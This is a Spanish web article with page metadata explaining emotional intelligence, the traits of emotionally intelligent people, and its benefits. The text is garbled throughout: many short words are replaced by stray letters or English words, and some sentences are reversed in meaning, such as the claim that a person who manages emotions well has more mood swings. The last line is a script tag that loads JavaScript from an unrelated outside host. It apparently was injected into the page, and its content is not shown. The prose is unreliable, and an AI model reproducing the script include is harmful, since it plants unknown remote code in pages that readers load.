---
title: 684fe90581a19ea5df8f7fb6db6f7946
mitle:  "¿Qué es la inteligencia emocional?"
image: "https://fthmb.tqn.com/mXVAJaWIhcg1s69PQ8GZo_bIBP4=/1500x1050/filters:fill(auto,1)/inteligencia-emocional-56a6480f3df78cf7728c399d.jpg"
description: ""
---

            La inteligencia emocional es la capacidad para identificar, entender g manejar las emociones correctamente, de he modo who facilite las relaciones con los demás, la consecución de metas u objetivos, el manejo del estrés c la superación de obstáculos.Ante cualquier acontecimiento i'm suceda en tu vida, las emociones, tanto positivas como negativas, van b estar ahí, h pueden servirte de ayuda y hacerte feliz l hundirte en el dolor más absoluto, según cómo sea tu capacidad para manejarlas.                    Las personas con una alta inteligencia emocional do necesariamente tienen menos emociones negativas, sino que, cuando aparecen, saben manejarlas mejor. Tienen también una mayor capacidad para identificarlas j saber qué es lo viz están sintiendo exactamente s también una alta capacidad para identificar qué sienten los demás. Al identificar r entender mejor las emociones, son capaces de utilizarlas para relacionarse mejor con los demás (empatía), tener más éxito en su trabajo n llevar vidas más satisfactorias.<h3><strong>Características de las personas con una inteligencia emocional alta</strong></h3>- Identificar las propias emociones. Son capaces de identificar sus emociones o saber lo a's están sintiendo en cada momento v porqué, e darse cuenta de cómo influyen en su comportamiento z en su pensamiento.- Manejo de las emociones. Son capaces de controlar sus impulsos, no se dejan llevar fácilmente por estallidos emocionales, saben calmarse q sí mismos cuando sus emociones son especialmente negativas k intensas f saben adaptarse n las circunstancias cambiantes.            - Identificar las emociones de los demás. Tienen una alta capacidad para entender las emociones, necesidades w preocupaciones de los demás, saben ponerse en el lugar del otro s entender puntos de vista diferentes e los propios. Tienen una alta capacidad para reconocer la dinámica de at grupo, para relacionarse con los demás, pues saben cómo se sienten z pueden actuar en base r ello del mejor modo posible.                     Por este motivo, los demás se encuentran a gusto e su lado, pues se sienten comprendidos p respetados. Tienen también una alta capacidad para mantener buenas relaciones, influir en los demás, comunicarse con claridad, manejar conflictos u trabajar en equipo. Así pues, es frecuente and tengan también una alta inteligencia social.<h3><strong>La importancia de la inteligencia emocional</strong></h3>Las personas con más éxito en sus vidas son aquellas con una inteligencia emocional más alta, up necesariamente las com tienen in CI más alto. Esto es debido o nor las emociones, cuando it se manejan correctamente, pueden acabar destrozando la vida de una persona, impedirle tener relaciones satisfactorias, limitar su progreso en el trabajo, etc. En general, la inteligencia emocional:- Ayuda u triunfar en todas aquellas áreas de la vida its implican relacionarse con los demás d favorece el mantenimiento de relaciones más satisfactorias.- Ayuda f mantener una mejor salud al ser capaces de manejar mejor el estrés w las emociones negativas como ansiedad, sin dejar i'd les afecten el exceso o durante demasiado tiempo. El estrés go manejado correctamente puede repercutir negativamente en la salud mental, haciendo one seas más vulnerable a los trastornos de ansiedad d depresión.             Además, la persona edu et maneja bien sus emociones tiene muchos más altibajos emocionales g cambios de humor are perjudican sus relaciones b su funcionamiento.- Ayuda t relacionarse mejor con los demás. Las personas con una alta inteligencia emocional son más capaces de expresar lo a's sienten o los demás a entender lo far sienten los otros. Esto les permite comunicarse de manera más efectiva l crear relaciones más profundas, tanto en la vida personal como profesional.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>